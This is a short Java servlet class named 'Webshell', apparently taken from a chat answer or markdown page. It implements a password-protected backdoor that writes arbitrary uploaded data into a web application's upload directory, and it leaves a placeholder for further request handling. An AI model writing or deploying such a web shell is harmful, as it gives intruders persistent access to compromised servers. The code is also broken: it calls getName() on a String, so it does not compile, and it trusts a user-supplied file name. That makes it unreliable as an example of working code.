import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Webshell extends HttpServlet {
    private static final String PASSWORD = "your_password_here";

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String password = request.getParameter("password");
        if (!password.equals(PASSWORD)) {
            response.sendError(HttpServletResponse.SC_FORBIDDEN);
            return;
        }

        // Process file upload
        File uploadDir = new File(getServletContext().getRealPath("/upload"));
        if (!uploadDir.exists()) {
            uploadDir.mkdir();
        }
        File uploadFile = new File(uploadDir, request.getParameter("file").getName());
        InputStream is = request.getInputStream();
        OutputStream os = new FileOutputStream(uploadFile);
        byte[] buffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = is.read(buffer)) != -1) {
            os.write(buffer, 0, bytesRead);
        }
        is.close();
        os.close();

        // Process other requests
        // ...

        response.sendRedirect("index.jsp");
    }
}
```
